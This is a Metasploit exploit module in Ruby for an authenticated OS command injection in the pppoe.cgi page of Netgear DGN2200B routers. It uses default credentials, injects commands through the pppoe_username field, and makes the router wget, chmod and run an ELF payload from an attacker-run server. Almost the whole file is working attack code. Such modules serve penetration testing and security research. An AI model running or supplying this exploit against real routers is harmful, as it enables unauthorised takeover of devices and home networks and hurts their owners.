##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Netgear DGN2200B pppoe.cgi Remote Command Execution',
      'Description' => %q{
          Some Netgear Routers are vulnerable to an authenticated OS command injection
        on their web interface. Default credentials for the web interface are admin/admin
        or admin/password. Since it is a blind os command injection vulnerability, there
        is no output for the executed command when using the cmd generic payload. A ping
        command against a controlled system could be used for testing purposes. This module
        overwrites parts of the PPOE configuration, while the module tries to restore it
        after exploitation configuration backup is recommended.
      },
      'Author'      =>
        [
          'Michael Messner <devnull@s3cur1ty.de>', # Vulnerability discovery and Metasploit module
          'juan vazquez' # minor help with msf module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'BID', '57998' ],
          [ 'EDB', '24513' ],
          [ 'OSVDB', '90320' ],
          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-015' ]
        ],
      'DisclosureDate' => 'Feb 15 2013',
      'Privileged'     => true,
      'Platform'       => ['linux','unix'],
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Targets'        =>
        [
          [ 'CMD',
            {
            'Arch' => ARCH_CMD,
            'Platform' => 'unix'
            }
          ],
          [ 'Linux mipsbe Payload',
            {
            'Arch' => ARCH_MIPSBE,
            'Platform' => 'linux'
            }
          ],
        ],
      'DefaultTarget'  => 1,
      ))

    register_options(
      [
        OptString.new('USERNAME', [ true, 'The username to authenticate as', 'admin' ]),
        OptString.new('PASSWORD', [ true, 'The password for the specified username', 'password' ]),
        OptAddress.new('DOWNHOST', [ false, 'An alternative host to request the MIPS payload from' ]),
        OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),
        OptInt.new('HTTP_DELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 60]),
        OptInt.new('RELOAD_CONF_DELAY', [true, 'Time to wait to allow the remote device to load configuration', 45])
      ], self.class)
  end

  def get_config(config, pattern)
    if config =~ /#{pattern}/
      #puts "[*] #{$1}"  #debugging
      return $1
    end
    return ""
  end

  def grab_config(user,pass)
    print_status("#{rhost}:#{rport} - Trying to download the original configuration")
    begin
      res = send_request_cgi({
        'uri'     => '/BAS_pppoe.htm',
        'method'  => 'GET',
        'authorization' => basic_auth(user,pass)
      })
      if res.nil? or res.code == 404
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
      if [200, 301, 302].include?(res.code)
        if res.body =~ /pppoe_username/
          print_good("#{rhost}:#{rport} - Successfully downloaded the configuration")
        else
          fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - Download of the original configuration not possible or the device uses a configuration which is not supported")
        end
      else
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
    rescue ::Rex::ConnectionError
      fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport} - Failed to connect to the web server")
    end

    @pppoe_username_orig = get_config(res.body, "<td\ align=\"right\"><input\ type=\"text\"\ name=\"pppoe_username\"\ size=\"15\"\ maxlength=\"63\"\ value=\"(.*)\"><\/td")
    @pppoe_passwd_orig = get_config(res.body, "<td\ align=\"right\"><input\ type=\"password\"\ name=\"pppoe_passwd\"\ size=\"15\"\ maxlength=\"63\"\ value=\"(.*)\"><\/td")
    @pppoe_servicename_orig = get_config(res.body, "<td\ align=\"right\"><input\ type=\"text\"\ name=\"pppoe_servicename\"\ maxlength=\"63\"\ size=\"15\"\ value=\"(.*)\"><\/td")

    @runtest_orig = get_config(res.body, "<input\ type=\"hidden\"\ name=\"runtest\"\ value=\"(.*)\">")
    @wan_ipaddr_orig = get_config(res.body, "<INPUT\ name=wan_ipaddr\ type=hidden\ value=\ \"(.*)\">")
    @pppoe_localip_orig = get_config(res.body, "<INPUT\ name=pppoe_localip\ type=hidden\ value=\ \"(.*)\">")
    @wan_dns_sel_orig = get_config(res.body, "<INPUT\ name=wan_dns_sel\ type=hidden\ value=\ \"(.*)\">")
    @wan_dns1_pri_orig = get_config(res.body, "<INPUT\ name=wan_dns1_pri\ type=hidden\ value=\ \"(.*)\">")
    @wan_dns1_sec_orig = get_config(res.body, "<INPUT\ name=wan_dns1_sec\ type=hidden\ value=\ \"(.*)\">")
    @wan_hwaddr_sel_orig = get_config(res.body, "<INPUT\ name=wan_hwaddr_sel\ type=hidden\ value=\ \"(.*)\">")
    @wan_hwaddr_def_orig = get_config(res.body, "<INPUT\ name=wan_hwaddr_def\ type=hidden\ value=\ \"(.*)\">")
    @wan_hwaddr2_orig = get_config(res.body, "<INPUT\ name=wan_hwaddr2\ type=hidden\ value=\ \"(.*)\">")
    @wan_hwaddr_pc_orig = get_config(res.body, "<INPUT\ name=wan_hwaddr_pc\ type=hidden\ value=\ \"(.*)\">")
    @wan_nat_orig = get_config(res.body, "<INPUT\ name=wan_nat\ type=hidden\ value=\ \"(.*)\">")
    @opendns_parental_ctrl_orig = get_config(res.body, "<INPUT\ name=opendns_parental_ctrl\ type=hidden\ value=\ \"(.*)\">")
    @pppoe_flet_sel_orig = get_config(res.body, "<INPUT\ name=pppoe_flet_sel\ type=hidden\ value=\ \"(.*)\">")
    @pppoe_flet_type_orig = get_config(res.body, "<INPUT\ name=pppoe_flet_type\ type=hidden\ value=\ \"(.*)\">")
    @pppoe_temp_orig = get_config(res.body, "<INPUT\ name=pppoe_temp\ type=hidden\ value=\ \"(.*)\">")
    @apply_orig = get_config(res.body, "<input\ type=\"SUBMIT\"\ name=\"apply\"\ value=(.*)\ onClick=\"return\ checkData\(\)\">")
  end

  def restore_conf(user,pass,uri)
    # we have used most parts of the original configuration
    # just need to restore pppoe_username
    cmd = @pppoe_username_orig
    print_status("#{rhost}:#{rport} - Asking the Netgear device to reload original configuration")

    res = request(cmd,user,pass,uri)

    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to reload original configuration")
    end

    print_status("#{rhost}:#{rport} - Waiting #{@timeout} seconds for reloading the configuration")
    select(nil, nil, nil, @timeout)
  end

  def request(cmd,user,pass,uri)
    begin

    #original post request
    #login_type=PPPoE%28PPP+over+Ethernet%29&pppoe_username=%26%20COMMAND%20%26
    #&pppoe_passwd=69cw20hb&pppoe_servicename=&pppoe_dod=1&pppoe_idletime=5
    #&WANAssign=Dynamic&DNSAssign=0&en_nat=1&MACAssign=0&apply=%C3%9Cbernehmen
    #&runtest=yes&wan_ipaddr=0.0.0.0&pppoe_localip=0.0.0.0&wan_dns_sel=0
    #&wan_dns1_pri=0.0.0.0&wan_dns1_sec=...&wan_hwaddr_sel=0
    #&wan_hwaddr_def=84%3A1B%3A5E%3A01%3AE7%3A05&wan_hwaddr2=84%3A1B%3A5E%3A01%3AE7%3A05
    #&wan_hwaddr_pc=5C%3A26%3A0A%3A2B%3AF0%3A3F&wan_nat=1&opendns_parental_ctrl=0
    #&pppoe_flet_sel=&pppoe_flet_type=&pppoe_temp=&opendns_parental_ctrl=0
      res = send_request_cgi(
        {
          'uri'  => uri,
          'method' => 'POST',
          'authorization' => basic_auth(user,pass),
          'encode_params' => false,
          'vars_post' => {
            "login_type" => "PPPoE%28PPP+over+Ethernet%29",#default must be ok
            "pppoe_username" => cmd,
            "pppoe_passwd" => @pppoe_passwd_orig,
            "pppoe_servicename" => @pppoe_servicename_orig,
            "pppoe_dod" => "1",    #default must be ok
            "pppoe_idletime" => "5",  #default must be ok
            "WANAssign" => "Dynamic",  #default must be ok
            "DNSAssign" => "0",    #default must be ok
            "en_nat" => "1",    #default must be ok
            "MACAssign" => "0",    #default must be ok
            "apply" => @apply_orig,
            "runtest" => @runtest_orig,
            "wan_ipaddr" => @wan_ipaddr_orig,
            "pppoe_localip" => @pppoe_localip_orig,
            "wan_dns_sel" => @wan_dns_sel_orig,
            "wan_dns1_pri" => @wan_dns1_pri_orig,
            "wan_dns1_sec" => @wan_dns1_sec_orig,
            "wan_hwaddr_sel" => @wan_hwaddr_sel_orig,
            "wan_hwaddr_def" => @wan_hwaddr_def_orig,
            "wan_hwaddr2" => @wan_hwaddr2_orig,
            "wan_hwaddr_pc" => @wan_hwaddr_pc_orig,
            "wan_nat" => @wan_nat_orig,
            "opendns_parental_ctrl" => @opendns_parental_ctrl_orig,
            "pppoe_flet_sel" => @pppoe_flet_sel_orig,
            "pppoe_flet_type" => @pppoe_flet_type_orig,
            "pppoe_temp" => @pppoe_temp_orig,
            "opendns_parental_ctrl" => @opendns_parental_ctrl_orig
          }
        })
      return res
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return nil
    end
  end

  def logout(user,pass)
    begin
      res = send_request_cgi({
        'uri'     => '/LGO_logout.htm',
        'method'  => 'GET',
        'authorization' => basic_auth(user,pass)
      })
      if res.nil? or res.code == 404
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful logout possible")
      end
    rescue ::Rex::ConnectionError
      fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport} - Failed to connect to the web server")
    end

  end

  def exploit
    downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(8))
    uri = '/pppoe.cgi'
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
    @timeout = datastore['RELOAD_CONF_DELAY']

    #
    # testing Login
    #
    print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")
    begin
      res = send_request_cgi({
        'uri'     => '/',
        'method'  => 'GET',
        'authorization' => basic_auth(user,pass)
      })
      if res.nil? or res.code == 404
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
      if [200, 301, 302].include?(res.code)
        print_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
      else
        fail_with(Exploit::Failure::NoAccess, "#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
      end
    rescue ::Rex::ConnectionError
      fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport} - Failed to connect to the web server")
    end

    grab_config(user,pass)

    if target.name =~ /CMD/
      if not (datastore['CMD'])
        fail_with(Exploit::Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")
      end
      cmd = payload.encoded
      cmd = "%26%20#{cmd}%20%26"
      res = request(cmd,user,pass,uri)
      if (!res)
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
      else
        print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
      end
      return
    end

    #thx to Juan for his awesome work on the mipsel elf support
    @pl = generate_payload_exe
    @elf_sent = false

    #
    # start our server
    #
    resource_uri = '/' + downfile

    if (datastore['DOWNHOST'])
      service_url = 'http://' + datastore['DOWNHOST'] + ':' + datastore['SRVPORT'].to_s + resource_uri
    else
      #do not use SSL
      if datastore['SSL']
        ssl_restore = true
        datastore['SSL'] = false
      end

      #we use SRVHOST as download IP for the coming wget command.
      #SRVHOST needs a real IP address of our download host
      if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
        srv_host = Rex::Socket.source_address(rhost)
      else
        srv_host = datastore['SRVHOST']
      end

      service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri
      print_status("#{rhost}:#{rport} - Starting up our web service on #{service_url} ...")
      start_service({'Uri' => {
        'Proc' => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        'Path' => resource_uri
      }})

      datastore['SSL'] = true if ssl_restore
    end

    #
    # download payload
    #
    print_status("#{rhost}:#{rport} - Asking the Netgear device to download and execute #{service_url}")
    #this filename is used to store the payload on the device
    filename = rand_text_alpha_lower(8)

    cmd = "/usr/bin/wget #{service_url} -O /tmp/#{filename};chmod 777 /tmp/#{filename};/tmp/#{filename}"
    cmd = Rex::Text.uri_encode(cmd)
    cmd = "%26%20#{cmd}%20%26"
    res = request(cmd,user,pass,uri)
    if (!res)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end

    # wait for payload download
    if (datastore['DOWNHOST'])
      print_status("#{rhost}:#{rport} - Giving #{datastore['HTTP_DELAY']} seconds to the Netgear device to download the payload")
      select(nil, nil, nil, datastore['HTTP_DELAY'])
    else
      wait_linux_payload
    end
    register_file_for_cleanup("/tmp/#{filename}")

    #
    #reload original configuration
    #
    restore_conf(user,pass,uri)

    #
    #lockout of the device and free the management sessions
    #
    logout(user,pass)
  end

  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    #print_status("on_request_uri called: #{request.inspect}")
    if (not @pl)
      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!")
      return
    end
    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
    @elf_sent = true
    send_response(cli, @pl)
  end

  # wait for the data to be sent
  def wait_linux_payload
    print_status("#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...")

    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore['HTTP_DELAY'])
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it cant connect back to us?")
      end
    end
  end

end
